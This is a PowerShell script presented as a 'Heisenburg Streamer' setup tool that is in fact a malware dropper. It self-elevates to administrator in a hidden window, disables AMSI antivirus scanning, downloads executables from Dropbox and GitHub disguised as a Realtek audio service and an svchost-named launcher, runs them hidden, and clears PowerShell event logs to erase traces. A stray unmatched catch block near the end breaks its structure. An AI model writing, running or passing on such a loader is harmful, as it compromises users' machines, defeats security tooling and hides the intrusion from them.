# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM v6.8 (FINAL FIXED)
# ========================================================

function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ================= CONFIG =================
$MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
$MainExePath = "$env:TEMP\$RandomName.exe"
$LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
# =========================================

function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + ">" + ("." * $left) + "]"
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor Cyan
}

# Hyper Downloader Function (agar missing ho)
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Mozilla/5.0"
        $request.Timeout = 60000
        $response = $request.GetResponse()
        $totalSize = 100MB
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        return $true
    } catch {
        return $false
    }
}

Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow

# Downloads
$MainDownload = Invoke-HyperStreamDownload -Url $MainExeUrl -TargetPath $MainExePath
if (-not $MainDownload) {
    throw "Main EXE Download Failed"
}

Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green

# Download Stealth Launcher
Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60 -ErrorAction Stop
Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green

# Run Stealth Launcher
Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
try {
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $LauncherPath
    $si.Arguments = "`"$MainExePath`""
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    $si.Verb = "RunAs"
    [System.Diagnostics.Process]::Start($si) | Out-Null
} catch {
    Write-Host "[-] Stealth Launcher Start Failed" -ForegroundColor Yellow
}

# Run Main EXE
try {
    $si2 = New-Object System.Diagnostics.ProcessStartInfo
    $si2.FileName = $MainExePath
    $si2.WindowStyle = 'Hidden'
    $si2.CreateNoWindow = $true
    $si2.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si2) | Out-Null
} catch {}

Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
Write-Host "[*] Process is now hidden from Task Manager" -ForegroundColor White

# Cleanup
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green

} catch {
    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Variable * -ErrorAction SilentlyContinue 2>$null
